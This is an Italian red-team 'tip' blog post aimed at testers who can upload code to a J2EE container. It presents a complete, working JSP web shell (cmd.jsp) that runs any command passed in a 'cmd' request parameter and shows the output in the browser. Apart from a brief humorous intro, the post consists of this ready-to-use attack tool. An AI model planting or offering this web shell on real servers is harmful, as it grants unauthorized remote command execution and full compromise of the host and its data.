---
layout: tip
title: "Una shell, datemi una shell"
tags: [java, jsp, shell, web shell, shell, attacker, redteam]
level: basic
image:
  feature:
  credit:
  creditlink:
comments: true
share: true
order: 1
---

Sei lì e nel buio della sala riunioni del tuo cliente, di fronte al tuo caffé
da 0,34€ erogato da un dispenser mai pulito, hai trovato il modo di fare upload
di codice Java su un J2EE container.

Che sia grazie ad un metodo PUT, che sia perché l'applicazione web ha è bucata
come il groviera, vuoi una shell da buttare su al volo, qualcosa di veramente
_quick and dirty_.

{% highlight java %}
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
{% endhighlight %}
